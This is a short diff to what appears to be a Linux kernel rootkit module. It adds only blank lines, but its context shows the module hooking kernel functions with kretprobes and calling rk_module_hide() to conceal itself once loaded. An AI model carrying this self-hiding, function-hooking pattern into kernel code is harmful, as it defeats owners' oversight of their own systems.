@@ -68,6 +68,7 @@ static int __init rk_init(void)
 			goto fail_probes;
 		nr_probes++;
 	}
+
 	rk_module_hide();
 
 	return 0;
@@ -83,6 +84,7 @@ static void __exit rk_exit(void)
 	int i;
 
 	rk_module_unhide();
+
 	for (i = nr_probes - 1; i >= 0; i--)
 		unregister_kretprobe(probes[i]);
 }
